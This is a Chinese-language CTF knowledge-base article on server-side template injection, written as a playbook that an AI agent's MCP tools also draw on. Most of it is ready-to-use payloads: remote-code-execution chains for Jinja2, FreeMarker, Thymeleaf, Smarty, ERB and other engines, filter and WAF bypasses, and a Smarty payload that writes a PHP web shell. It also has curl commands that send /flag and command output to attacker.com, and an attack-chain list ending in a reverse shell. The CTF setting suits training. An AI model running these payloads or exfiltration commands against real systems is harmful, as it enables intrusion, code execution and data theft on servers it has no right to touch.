---
id: "ctf-website/03-injection/ssti"
title: "SSTI (Server-Side Template Injection)"
title_en: "Server-Side Template Injection (SSTI)"
summary: >
  服务器端模板注入完整指南，覆盖模板引擎指纹识别决策树、Jinja2/Twig/Thymeleaf/Velocity/FreeMarker/Tornado/Smarty/ERB 等多引擎 RCE 利用链，以及点号/下划线/引号过滤绕过、无回显 OOB 外带和 WAF 绕过等高级技巧。
summary_en: >
  A complete guide to Server-Side Template Injection covering a template engine fingerprinting decision tree, RCE exploit chains for Jinja2, Twig, Thymeleaf, Velocity, FreeMarker, Tornado, Smarty, ERB, and more, plus advanced bypasses for dot, underscore, and quote filters, blind OOB exfiltration, and WAF evasion.
board: "ctf-website"
category: "03-injection"
signals: ["SSTI", "模板注入", "Jinja2", "Thymeleaf", "FreeMarker", "RCE", "沙盒逃逸", "__class__"]
mcp_tools: ["http_probe", "run_ctf_tool", "kb_router"]
keywords: ["SSTI", "模板注入", "Jinja2", "Thymeleaf", "FreeMarker", "沙盒逃逸", "RCE", "tplmap", "sstimap"]
difficulty: "advanced"
tags: ["injection", "ssti", "template-engine", "rce", "web-security", "sandbox-escape", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---

# SSTI (Server-Side Template Injection)

服务器端模板注入（SSTI）发生在模板引擎不安全地将用户输入直接拼接进模板字符串中解析并执行时。这能允许攻击者在模板渲染引擎的上下文中执行任意代码，引发严重的 RCE。

---

## 1. 模板引擎指纹识别 (Fingerprinting)

在发起任何沙盒逃逸前，必须精确判断目标后端所采用的模板引擎。

```text
                           ${7*7}
                          /      \
                      {{7*7}}     a*b (不解析)
                     /      \          |
               a*b (不解析)  49        Smarty
                 /          /  \
             49 (Jinja2)  49    ${7*7}
                         /        |
                     Twig      Freemarker / Velocity
```

*   **测试 Payload 序列**：
    *   `${7*7}`：通常返回 `49` 说明是 Java/PHP/Ruby 模板引擎。
    *   `{{7*7}}`：通常返回 `49` 说明是 Python (Jinja2, Tornado) 或 PHP (Twig)。
    *   `<%= 7*7 %>`：说明是 Ruby (ERB) 或 ASP/JSP 经典标签。
    *   `*{7*7}`：说明是 Thymeleaf。

### A. 指纹分叉表

| Payload | 期望回显 | 重点分叉 | 下一步 |
|---|---|---|---|
| `{{7*7}}` | `49` | Jinja2 / Twig / Tornado | 测 `{{config}}`、`{{_self}}`、`{{handler.settings}}` |
| `${7*7}` | `49` | FreeMarker / Velocity / JSP EL | 测 `${"freemarker.template.utility.Execute"?new()}` 或 `$class.inspect` |
| `<%=7*7%>` | `49` | ERB / Rails / EJS | 测 `<%= File.read('/flag') %>` 或 Node 全局对象 |
| `#{7*7}` | `49` | Spring EL / Ruby interpolation | 测 `T(java.lang.Runtime)` |
| `*{7*7}` | `49` | Thymeleaf selection expression | 套 `__${...}__::.x` |
| `${{7*7}}` | 报语法错 | 多层模板或二次渲染 | 将 payload 拆到参数、Cookie、Header |

失败样本也有价值：如果输入被原样 HTML escape，转向二次渲染、Markdown/邮件模板、PDF 模板；如果只在错误页出现表达式结果，优先打异常路径。

---

## 2. Python Jinja2 沙盒逃逸与利用链

Jinja2 拥有强大的 Python 反射机制。如果我们可以直接或间接访问 `__class__`，就能回溯到基类 `object` 并定位到 `os` 模块。

### A. 经典命令执行 (RCE) 利用链
*   **利用 `__subclasses__` 定位危害类**：
    我们可以通过遍历 `object.__subclasses__()` 查找引入了 `os` 模块的内置类（如 `sys` 或 `warnings`）。
    ```python
    # 通过查找 warnings.catch_warnings 类（通常在 subclasses 的前两百个内）
    {{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('whoami').read() }}
    ```
*   **利用 `__import__` 动态加载**：
    ```python
    {{ [].__class__.__base__.__subclasses__()[0].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}
    ```

### A.1 Jinja2 对象遍历定位脚本

`__subclasses__()[132]` 不是固定值，Python 版本、依赖加载顺序都会改变。实战里先让模板枚举类名，再根据 `catch_warnings`、`subprocess.Popen`、`FileLoader` 等关键词定位 index。

```jinja
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{{ loop.index0 }}:{{ c.__module__ }}.{{ c.__name__ }}
{% endfor %}
```

如果回显太短，用分段窗口：

```jinja
{% for c in ''.__class__.__mro__[1].__subclasses__()[120:180] %}
{{ loop.index0 + 120 }}:{{ c.__name__ }}
{% endfor %}
```

拿到 index 后优先走“已加载模块”链，少依赖 `__import__`：

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['os'].popen('id').read() }}
```

如果 `os` 不在 globals，改查 `__builtins__`：

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

### B. 绕过 WAF 过滤技巧

如果在 CTF 中遇到了输入长度限制或强力 WAF 过滤：

*   **绕过 `.`（点号）过滤**：
    使用 `[]` 中括号或 `attr` 过滤器替代点号：
    ```python
    {{ ''['__class__']['__mro__'][1] }}
    {{ ''|attr('__class__')|attr('__mro__') }}
    ```
*   **绕过双下划线 `__` 过滤**：
    使用十六进制编码（如 `\x5f\x5f` 代表 `__`），配合 `[]` 检索：
    ```python
    # 动态拼接字符串
    {{ ''['\x5f\x5fclass\x5f\x5f'] }}
    ```
*   **绕过引号 `'` / `"` 过滤**：
    *   利用 `request` 对象获取外部参数，将恶意字符串转移到 GET/POST/Cookie 字段中：
        ```jinja
        {{ ''['__class__']['__mro__'][1].__subclasses__()[132].__init__.__globals__[request.args.cmd](request.args.arg).read() }}
        ```
        *请求时附加参数：`?cmd=popen&arg=cat+/flag`。*
    *   使用 `chr` 编码拼接：
        `{% set popen = (dict(p=1)|join~dict(o=1)|join~dict(p=1)|join~dict(e=1)|join~dict(n=1)|join) %}`
    *   利用内置 `lipsum` 或 `config` 关键字：
        `{{ lipsum.__globals__['os']['popen']('whoami').read() }}`

### C. 过滤器对照表

| 被过滤字符/关键词 | 可替代写法 | 说明 |
|---|---|---|
| `.` | `|attr('name')` / `['name']` | 属性访问换成 filter 或 item lookup |
| `_` | `'\x5f'` 拼接 / `request.args.u` | 把关键字符串移到参数里 |
| `[` `]` | `|attr('__getitem__')('key')` | 绕数组/字典下标过滤 |
| `'` `"` | `dict(a=1)|join` / GET 参数 | 通过模板语法拼字符串 |
| `class` | `request.args.c` | `?c=__class__` |
| `config` | `url_for.__globals__` / `lipsum.__globals__` | Flask 常见全局对象替代 |
| `popen` | `getattr(os, request.args.f)` | 函数名外置 |
| `{{` | `{% print ... %}` / 控制块副作用 | Jinja2 可用 statement block |

CTF 题常见“只过滤一次”的情况，先测二次编码和字符串拼接：

```jinja
{{ request|attr(request.args.a)|attr(request.args.b) }}
# ?a=application&b=__self__

{{ (dict(__=x)|join ~ dict(class=x)|join ~ dict(__=x)|join) }}
```

---

## 3. Java 模板引擎利用 (Thymeleaf / Velocity / FreeMarker)

Java 模板引擎可以通过实例化 Java Runtime 类直接执行命令：

*   **Thymeleaf 注入（常用于 Spring Boot 应用）**：
    在 Thymeleaf 渲染控制器的 URL 参数时触发：
    ```text
    __${T(java.lang.Runtime).getRuntime().exec("curl http://attacker.com")}__::.x
    ```
*   **Velocity 注入**：
    ```text
    #set($str="")
    #set($class=$str.getClass())
    #set($cl=$class.forName("java.lang.Runtime"))
    #set($method=$cl.getMethod("getRuntime",null))
    #set($rt=$method.invoke(null,null))
    #set($exec=$cl.getMethod("exec",$class))
    #set($process=$exec.invoke($rt,"whoami"))
    ```
*   **FreeMarker 注入**：
    使用内置的 `freemarker.template.utility.Execute` 执行：
    ```text
    <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("whoami")}
    ```
    **沙盒绕过（Execute 被封时）**：当 `TemplateClassResolver.SAFER_RESOLVER` 禁止 `?new()` 实例化工具类时，可转而通过模板 Model 中的普通 Bean 对象（如 `product`）走 Java 反射链：
    ```freemarker
    # 通过 product 对象反射链读取任意文件
    ${product.getClass()
      .getProtectionDomain()
      .getCodeSource()
      .getLocation()
      .toURI()
      .resolve("/tmp/reverselab-demo/my_password.txt")
      .toURL()
      .openStream()
      .readAllBytes()?join(" ")}

    # 通用执行命令: product.getClass().forName("java.lang.Runtime")...
    ${product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("whoami")}
    ```
    原理：Model Bean 不经 `TemplateClassResolver`，getter 方法自由可调。防御需用 `TemplateModel` 接口包装 model 对象，而非仅依赖 `?new()` 拦截。

---

---

## 4. 更多引擎利用

### Tornado (Python)

```python
# Tornado 模板引擎
{{ __import__('os').popen('whoami').read() }}
{{ handler.settings }}  # 泄露 tornado 配置 (含 cookie_secret)
{{ globals()['__builtins__']['__import__']('os').popen('id').read() }}
```

### Smarty (PHP)

```smarty
{system('whoami')}
{Smarty_Internal_Write_File::writeFile(['/var/www/shell.php','<?php system($_GET[c]);?>'])}
{php}system('whoami');{/php}
{include file='php://filter/convert.base64-encode/resource=/flag'}
```

### ERB (Ruby)

```erb
<%= system('whoami') %>
<%= `id` %>
<%= Dir.glob('/flag*') %>
<%= File.read('/flag') %>
```

### ASP.NET Razor

```razor
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
@{
    var p = System.Diagnostics.Process.Start("cmd.exe","/c whoami");
    p.WaitForExit();
}
```

### Pebble (Java)

```pebble
{% set cmd = 'whoami' %}
{{ cmd|e }}
{% for i in (1..1) %}{{ (new java.util.Scanner(new java.lang.ProcessBuilder('whoami').start().getInputStream())).useDelimiter('\\A').next() }}{% endfor %}
```

### 引擎级 payload 家族

| 引擎 | 读变量 | 读文件 | 执行/副作用 | 卡点 |
|---|---|---|---|---|
| Jinja2 | `{{config.items()}}` | `{{ lipsum.__globals__['open']('/flag').read() }}` | `os.popen()` | `SandboxedEnvironment` 拦属性 |
| Twig | `{{_self}}` | `{{'/flag'|file_excerpt(1,200)}}` | `{{['id']|filter('system')}}` | 新版本禁危险 filter |
| Smarty | `{$smarty.version}` | `{include file='/flag'}` | `{system('id')}` | `{php}` 标签关闭 |
| FreeMarker | `${.version}` | `${product.getClass()...openStream()}` | `Execute?new()` | `SAFER_RESOLVER` |
| Velocity | `$class.inspect("java.lang.Runtime")` | `FileInputStream` 反射 | `Runtime.exec` | toolbox 对象不足 |
| Thymeleaf | `${#ctx}` | `T(java.nio.file.Files).readString(...)` | `T(java.lang.Runtime)` | URL 表达式位置限制 |
| ERB | `<%= local_variables %>` | `<%= File.read('/flag') %>` | `<%= \`id\` %>` | 输出被 HTML escape |
| Razor | `@ViewData` | `System.IO.File.ReadAllText` | `Process.Start` | AppDomain 权限 |

如果模板只在邮件、PDF、错误页、后台预览里渲染，主请求可能看不到结果。此时用“可观测副作用”：时间延迟、DNS/HTTP OOB、写入临时字段、触发日志记录。

---

## 5. Jinja2 增强绕过

```python
# 如果 __class__ / __mro__ / __subclasses__ 被封:

# 绕过 1: 通过 request 对象
{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}

# 绕过 2: 通过 lipsum
{{ lipsum.__globals__['os'].popen('whoami').read() }}

# 绕过 3: 通过 cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# 绕过 4: 通过 namespace
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# 绕过 5: 无括号 (利用 filter)
# {{ ()|attr('__class__')|attr('__base__')|... }}

# 绕过 6: 通过 URL For
{{ url_for.__globals__['os'].popen('whoami').read() }}

# 绕过 7: 通过 get_flashed_messages
{{ get_flashed_messages.__globals__['os'].popen('id').read() }}

# 绕过 8: 利用 config 对象
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# 绕过 9: 字符串拼接构造关键字
{{ ''.__class__.__base__.__subclasses__()[(((1+1+1+1+1+1+1+1+1+1+1+1)*10)+12)] | attr('__init__') | attr('__globals__') | attr('__getitem__')('os') | attr('popen')('id') | attr('read')() }}

# 绕过 10: 利用 Unicode 混淆
{{ ()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f") }}
```

### 无回显 OOB

```python
# DNS OOB
{{ lipsum.__globals__['os'].popen('curl $(whoami).attacker.com').read() }}

# HTTP OOB
{{ config.__class__.__init__.__globals__['os'].popen('curl -d "$(cat /flag)" http://attacker.com/r').read() }}
```

---

## 6. 工具链

```bash
# tplmap — SSTI 自动探测
python2 tplmap.py -u "https://target.com/page?name=test"

# SSTImap — Python3 版
python3 sstimap.py -u "https://target.com/page?name=test"

# 手动 fuzzing
for payload in '{{7*7}}' '${7*7}' '{{7*7}}' '<%=7*7%>' '#{7*7}'; do
  curl -s "https://target.com/?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
done
```

## 7. 攻击链

```
SSTI → Python subprocess.Popen → RCE → flag 读取
SSTI → config 泄露 → SECRET_KEY → Flask session 伪造 → Admin
SSTI → 文件读取 → 源码泄露 → 发现硬编码密码 → DB/内网
SSTI → 内网探测 → SSRF → 内部 API 访问
SSTI → lipsum globals → os.popen → reverse shell
SSTI → Jinja2 → Python 反射链 → import socket → 内网隧道
SSTI → Thymeleaf → Runtime.exec → RCE → Spring Actuator
SSTI → WAF bypass → request.args 外带 → 盲注式外带 flag
```

---

## Evidence

记录: 算数验证、引擎类型、输入位置、渲染位置、最终链地址 (如 `__subclasses__()[132]` 的 index)、成功执行结果、绕过手法、失败样本。

最小证据包建议：

```json
{
  "entry": "GET /preview?tpl=",
  "engine": "Jinja2",
  "fingerprint": "{{7*7}} -> 49",
  "blocked_chars": [".", "_", "'"],
  "working_payload_family": "attr + request.args",
  "object_index": "catch_warnings at 132",
  "success_marker": "uid=33(www-data)",
  "failed_samples": ["{{config}} -> 403", "{{''.__class__}} -> filtered"]
}
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 探测模板注入 | `http_probe` | 发送 SSTI payload 探测 |
| 模板注入检测 | `run_ctf_tool tplmap` | 自动检测 SSTI |
| 按信号查技术 | `kb_router` | 搜索 ssti 相关技术文件 |


